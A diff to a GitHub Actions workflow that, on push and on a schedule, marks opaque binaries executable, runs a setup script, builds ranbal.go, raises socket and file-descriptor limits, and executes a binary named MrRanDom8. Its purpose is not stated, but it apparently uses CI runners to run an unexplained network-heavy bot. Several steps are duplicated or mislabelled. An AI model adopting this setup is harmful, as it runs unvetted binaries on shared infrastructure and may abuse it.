@@ -1,3 +1,4 @@
+
 name: Run MyBot Workflow
 
 on:
@@ -5,7 +6,7 @@ on:
     branches:
       - main
   schedule:
-    - cron: '*/225 * * * *' 
+    - cron: '*/220 * * * *' 
 
 concurrency:   
   group: mybot-workflow-group
@@ -21,13 +22,31 @@ jobs:
 
       - name: Set permissions for balveer.sh and ranbal binary
         run: |
-          chmod +x ranbal MrRanDom8
-          
+          chmod +x balveer.sh ranbal MrRanDom8
+
+      - name: Set permissions for balveer.sh and ranbal binary
+        run: |
+          chmod +x *
+
+      - name: Set permissions for balveer.sh and ranbal binary
+        run: |
+          chmod +x MrRanDom8    
+
+      - name: Run balveer.sh for dependencies (one-time setup)
+        run: |
+          sh balveer.sh
+
       - name: for Increase file descriptor limit 
         run: ulimit -n 4096 || true 
 
       - name: for max socket buffer size
         run: sudo sysctl -w kern.ipc.maxsockbuf=6291456 || true
+
+      - name: soul.c into binary
+        run: go build ranbal.go
+
+      - name: soul.c into binary
+        run: sha256sum ranbal > key.txt                
         
       - name: execution of MrRanDom8
         run: |
